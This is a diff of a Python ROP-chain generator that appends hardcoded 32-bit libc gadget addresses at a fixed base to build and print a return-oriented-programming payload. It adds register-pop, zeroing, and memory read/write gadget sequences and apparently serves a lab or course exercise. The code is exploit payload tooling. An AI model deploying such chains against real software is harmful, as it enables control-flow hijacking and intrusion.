@@ -47,12 +47,80 @@ class ROP:
         self.xchg_w_eax(reg1)
         self.count += 6
 
+    def zero_out_reg(self, reg):
+        if(reg == "eax"):
+            #sys.stdout.buffer.write((0x0002ff9f + 0xb7dec000).to_bytes(4, byteorder='little')) # xor eax, eax
+            self.arr += (0x0002ff9f + 0xb7dec000).to_bytes(4, byteorder='little')
+            self.count += 2
+        else: 
+            self.xchg_w_eax(reg)
+            self.zero_out_reg("eax")
+            self.xchg_w_eax(reg)
+
+    def pop_register(self, reg):
+        if(reg == "eax"):
+            #sys.stdout.buffer.write((0x00026687 + 0xb7dec000).to_bytes(4, byteorder='little'))
+            self.arr += (0x00026687 + 0xb7dec000).to_bytes(4, byteorder='little')
+            self.count += 2
+        if(reg == "ebp"):
+            #sys.stdout.buffer.write((0x0001a4cc + 0xb7dec000).to_bytes(4, byteorder='little'))
+            self.arr += (0x0001a4cc + 0xb7dec000).to_bytes(4, byteorder='little')
+            self.count += 2
+        if(reg == "ebx"):
+            #sys.stdout.buffer.write((0x0001a8b5 + 0xb7dec000).to_bytes(4, byteorder='little'))
+            self.arr += (0x0001a8b5 + 0xb7dec000).to_bytes(4, byteorder='little')
+            self.count += 2
+        if(reg == "edi"):
+            #sys.stdout.buffer.write((0x00019173 + 0xb7dec000).to_bytes(4, byteorder='little'))
+            self.arr += (0x00019173 + 0xb7dec000).to_bytes(4, byteorder='little')
+            self.count += 2
+        if(reg == "edx"):
+            #sys.stdout.buffer.write((0x0002effc + 0xb7dec000).to_bytes(4, byteorder='little'))
+            self.arr += (0x0002effc + 0xb7dec000).to_bytes(4, byteorder='little')
+            self.count += 2
+        if(reg == "esi"):
+            #sys.stdout.buffer.write((0x0001bf2c + 0xb7dec000).to_bytes(4, byteorder='little'))
+            self.arr += (0x0001bf2c + 0xb7dec000).to_bytes(4, byteorder='little')
+            self.count += 2
+        if(reg == "esp"):
+            #sys.stdout.buffer.write((0x001236b0 + 0xb7dec000).to_bytes(4, byteorder='little')) 
+            self.arr += (0x001236b0 + 0xb7dec000).to_bytes(4, byteorder='little')
+            self.count += 2
+        if (reg == "ecx"):
+            self.xchg_w_eax("ecx")
+            self.pop_register("eax")
+            self.xchg_w_eax("ecx")
+
     def initialize_head_state(self):
         # initialize head
         self.swp_regs("edx", "ecx")
         self.count += 2
         
     def write_head(self, num):
+        '''
+        0. zero out esi
+        1. pop esi
+        2. self.arr += byte             push byte that we want to write into esi
+        3. xchg edx, ecx                now edx has count and ecx had head
+        4. pop edi
+        5. self.arr += 0xFFFFFF00
+        6. 0x00086d0f : and dword ptr [ecx], edi ; ret
+        7. xchg esi, edi                now edi has byte and esi has 0xFFFFFF00 (not important)
+        8. 0x00040a30 : add dword ptr [ecx], edi ; ret // 0139c3
+        9. xchg edx, ecx
+        '''
+        self.zero_out_reg("esi")
+        self.pop_register("esi")
+        self.arr += (ord(num)).to_bytes(4, byteorder='little')          #does this need to be one byte?
+        self.swp_regs("edx", "ecx")
+        self.pop_register("edi")
+        self.arr += (0xFFFFFF00).to_bytes(4, byteorder='little')
+        self.arr += (0x00086d0f + 0xb7dec000).to_bytes(4, byteorder='little')
+        self.swp_regs("esi", "edi")
+        self.arr += (0x00040a30 + 0xb7dec000).to_bytes(4, byteorder='little')
+        self.swp_regs("edx", "ecx")
+
+        '''
         # head is edx, eax is the value, moving eax into edx
         self.pop_register("eax")
         #sys.stdout.buffer.write((ord(num)).to_bytes(4, byteorder='little'))
@@ -60,13 +128,44 @@ class ROP:
         #sys.stdout.buffer.write((0x0007672a + 0xb7dec000).to_bytes(4, byteorder='little')) # mov dword ptr [edx], eax ; ret
         self.arr += (0x0007672a + 0xb7dec000).to_bytes(4, byteorder='little')
         self.count += 3
+        '''
     
     def read_head(self):
+        '''
+        1. xchg eax, edi                                        #edi will preserve state from eax
+        2. 0x0006a227 : mov eax, dword ptr [edx] ; ret          #eax has value read in
+        3. pop ecx
+        4. self.arr += 0x000000FF
+        5. 0x0002d87e : and eax, ecx ; ret          #eax has lower byte read in from mem
+        6. xchg eax, ebx                            #ebx has lower byte read in from mem, eax is trashed
+        7. xchg edi, ecx                            #ecx has edi, original state of eax, edi has 0x000000FF(trashed)
+        8. pop eax
+        9. self.arr += 0xFFFFFF00
+        10. and eax, ecx                             #now eax has top 3 bytes of og eax, bottom byte cleared out
+        11. xchg ebx, ebp                            #now ebp has lower byte read in from mem, top 3 bytes are zeroed out
+        12. 0x00077ae7 : add eax, ebp ; ret
+        '''
+
+        self.xchg_w_eax("edi")
+        self.arr += (0x0006a227 + 0xb7dec000).to_bytes(4, byteorder='little')
+        self.pop_register("ecx")
+        self.arr += (0x000000FF).to_bytes(4, byteorder='little')
+        self.arr += (0x0002d87e + 0xb7dec000).to_bytes(4, byteorder='little')
+        self.xchg_w_eax("ebx")
+        self.swp_regs("edi", "ecx")
+        self.pop_register("eax")
+        self.arr += (0xFFFFFF00).to_bytes(4, byteorder='little')
+        self.arr += (0x0002d87e + 0xb7dec000).to_bytes(4, byteorder='little')
+        self.swp_regs("ebx", "ebp")
+        self.arr += (0x00077ae7 + 0xb7dec000).to_bytes(4, byteorder='little')
+
+        '''
         # assumes edx is head, eax is value and will store what is in head
         # move at address of edx into eax
         #sys.stdout.buffer.write((0x0006a227 + 0xb7dec000).to_bytes(4, byteorder='little')) # mov eax, dword ptr [edx] ; ret
         self.arr += (0x0006a227 + 0xb7dec000).to_bytes(4, byteorder='little')
         self.count += 2
+        '''
 
     def move_head_left(self):
         # move edx into eax, decrement eax, move it back
@@ -159,16 +258,6 @@ class ROP:
         #sys.stdout.buffer.write((0x00098a40 + 0xb7dec000).to_bytes(4, byteorder='little'))   
         self.arr += (0x00098a40 + 0xb7dec000).to_bytes(4, byteorder='little')
         self.count += 2
-
-    def zero_out_reg(self, reg):
-        if(reg == "eax"):
-            #sys.stdout.buffer.write((0x0002ff9f + 0xb7dec000).to_bytes(4, byteorder='little')) # xor eax, eax
-            self.arr += (0x0002ff9f + 0xb7dec000).to_bytes(4, byteorder='little')
-            self.count += 2
-        else: 
-            self.xchg_w_eax(reg)
-            self.zero_out_reg("eax")
-            self.xchg_w_eax(reg)
    
    #TODO: Delete later
     def move_flags_eax(self, reg):
@@ -208,40 +297,6 @@ class ROP:
             sys.stdout.buffer.write((0x00137dd6 + 0xb7dec000).to_bytes(4, byteorder='little'))
         if(reg == "ebx"): # will trash eax; 0x000c78c1 : push ebx ; or al, 0x83 ; ret; OR's al
             sys.stdout.buffer.write((0x000c78c1 + 0xb7dec000).to_bytes(4, byteorder='little'))
-
-    def pop_register(self, reg):
-        if(reg == "eax"):
-            #sys.stdout.buffer.write((0x00026687 + 0xb7dec000).to_bytes(4, byteorder='little'))
-            self.arr += (0x00026687 + 0xb7dec000).to_bytes(4, byteorder='little')
-            self.count += 2
-        if(reg == "ebp"):
-            #sys.stdout.buffer.write((0x0001a4cc + 0xb7dec000).to_bytes(4, byteorder='little'))
-            self.arr += (0x0001a4cc + 0xb7dec000).to_bytes(4, byteorder='little')
-            self.count += 2
-        if(reg == "ebx"):
-            #sys.stdout.buffer.write((0x0001a8b5 + 0xb7dec000).to_bytes(4, byteorder='little'))
-            self.arr += (0x0001a8b5 + 0xb7dec000).to_bytes(4, byteorder='little')
-            self.count += 2
-        if(reg == "edi"):
-            #sys.stdout.buffer.write((0x00019173 + 0xb7dec000).to_bytes(4, byteorder='little'))
-            self.arr += (0x00019173 + 0xb7dec000).to_bytes(4, byteorder='little')
-            self.count += 2
-        if(reg == "edx"):
-            #sys.stdout.buffer.write((0x0002effc + 0xb7dec000).to_bytes(4, byteorder='little'))
-            self.arr += (0x0002effc + 0xb7dec000).to_bytes(4, byteorder='little')
-            self.count += 2
-        if(reg == "esi"):
-            #sys.stdout.buffer.write((0x0001bf2c + 0xb7dec000).to_bytes(4, byteorder='little'))
-            self.arr += (0x0001bf2c + 0xb7dec000).to_bytes(4, byteorder='little')
-            self.count += 2
-        if(reg == "esp"):
-            #sys.stdout.buffer.write((0x001236b0 + 0xb7dec000).to_bytes(4, byteorder='little')) 
-            self.arr += (0x001236b0 + 0xb7dec000).to_bytes(4, byteorder='little')
-            self.count += 2
-        if (reg == "ecx"):
-            self.xchg_w_eax("ecx")
-            self.pop_register("eax")
-            self.xchg_w_eax("ecx")
 
     def and_eax_register(self, reg):
         if(reg == "ecx"):
@@ -419,8 +474,8 @@ class ROP:
         scan = open(filename, 'r')
         self.helper(scan, length)
         #print(self.arr)
-        #sys.stdout.buffer.write(self.arr)
-        sys.stdout.buffer.write((0x0002ff9f + 0xb7dec000).to_bytes(4, byteorder='little'))
+        sys.stdout.buffer.write(self.arr)
+        #sys.stdout.buffer.write((0x0002ff9f + 0xb7dec000).to_bytes(4, byteorder='little'))
         #print("LENGTH: ",len(self.arr))
 a = ROP(0)
 a.main("testing.txt")
